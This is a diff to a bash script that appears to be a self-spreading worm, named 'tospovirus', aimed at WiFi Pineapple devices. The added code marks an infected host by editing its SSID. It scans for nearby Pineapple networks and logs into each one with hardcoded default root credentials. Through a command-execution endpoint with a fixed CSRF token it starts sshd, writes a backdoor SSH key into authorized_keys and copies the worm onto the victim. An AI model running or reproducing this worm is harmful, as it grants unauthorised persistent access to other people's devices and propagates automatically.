@@ -1,36 +1,48 @@
 #!/bin/bash
-base=/tospo
-
 self=`uci get wireless.@wifi-iface[0].ssid`
+
+#Mark this device as already being infected by appending a whitespace to it's SSID.
+if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
+then
+       sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
+       uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
+       uci commit
+       wifi
+       exit
+fi
 
 pushstate() {
 	echo "Pushing state..."
-	uci export wireless > $base/w
-	uci export network > $base/n
+	uci export wireless > /tospo/w
+	uci export network > /tospo/n
 }
 
 popstate () {
 	echo "Popping state..."
-	ifconfig br-lan up
+	ifconfig br-lan 172.16.42.1 up
 	ifconfig wlan0 up
-	uci import -f $base/w
-	uci import -f $base/n
-	uci commit
+	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
+	uci import -f /tospo/w && uci commit
+	uci import -f /tospo/n && uci commit
 	wifi
 }
 
 connect() {
 	ssid=$1
 	echo "Connecting to $ssid..."
-	echo "Bringing radio up..."
+	echo "Bringing radio1 up..."
 	ifconfig wlan1 up
 	echo "Avoiding conflicts..."
-	ifconfig br-lan down
+	#TODO: Store this value to better preserve state for custom configurations
+	ifconfig br-lan 172.16.42.191 down
 	ifconfig wlan0 down
-	echo "Stripping keys..."	
+
+	#TODO: We reference wifi-iface[2] a lot, should this be something less specific?
+	#check against older versions to see if this remains regularly available.
+	echo "Stripping keys just in case..."	
 	uci delete wireless.@wifi-iface[2].key
 	uci delete wireless.@wifi-iface[2].encryption
-	echo "Connect to the target..."
+	echo "Connect to the target network will do DHCP..."
 	uci set wireless.@wifi-iface[2].network=wan
 	uci set wireless.@wifi-iface[2].mode=sta
 	uci set wireless.@wifi-iface[2].ssid="$ssid"
@@ -43,14 +55,36 @@ connect() {
 
 post() {
 	len=`printf "$2" | wc -c`
-	printf "POST $1 HTTP/1.1\nHost:172.16.42.1:1471\nContent-Type:application/x-www-form-urlencoded\nCookie:PHPSESSID=$3\nContent-Length:$len\nConnection: close\n\n$2" | nc 172.16.42.1 1471
+	printf "POST $1 HTTP/1.1\nHost: 172.16.42.1:1471\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=$3\nContent-Length: $len\nConnection: close\n\n$2" | nc 172.16.42.1 1471
 }
 
 login() {
 	echo "Logging in..."
 	creds="username=root&password=pineapplesareyummy&login="
-	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid' && bf && post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid' && echo "Login Failed..." && exit
+	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && popstate && exit
 	echo "Logged in Successfully!"
+}
+
+handshake() {
+	echo "Handshaking..."
+	rm /tospo/pu 2>/dev/null
+	post "/components/system/configuration/functions.php?execute=" "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd start;mkdir /tospo; openssl genrsa 512 >/tospo/pr%%26%%26openssl rsa -pubout -in /tospo/pr;" "tospovirus" | awk '/-----BEGIN PUBLIC KEY-----/,/-----END PUBLIC KEY-----/' > /tospo/pu
+	if [ ! -f /tospo/pu -a -s /tospo/pu  ]; then
+		echo "Failed to get public key from server..." && popstate && exit
+	fi
+}
+
+
+#TODO: Clean up this cluster fuck.
+infect() {
+	#echo "Transfering backdoor ssh key..."
+	if [ ! -f /tospo/tospo_rsa.pub ]; then
+		echo "Generating tospo ssh key..."
+		ssh-keygen -b 768 -f /root/.ssh/tospo_rsa -N ""
+	fi
+	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub) >> /root/.ssh/authorized_keys" "tospovirus"
+	scp -r /tospo 172.16.42.1:/ -i /tospo/tospo_rsa
+
 }
 
 echo "Scanning for new devices..."
@@ -58,7 +92,8 @@ for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$s
 do
 	pushstate
 	connect `echo $net | cut -d '"' -f 2`
-	login
+	login 
+	infect
 	popstate
 	break
 done
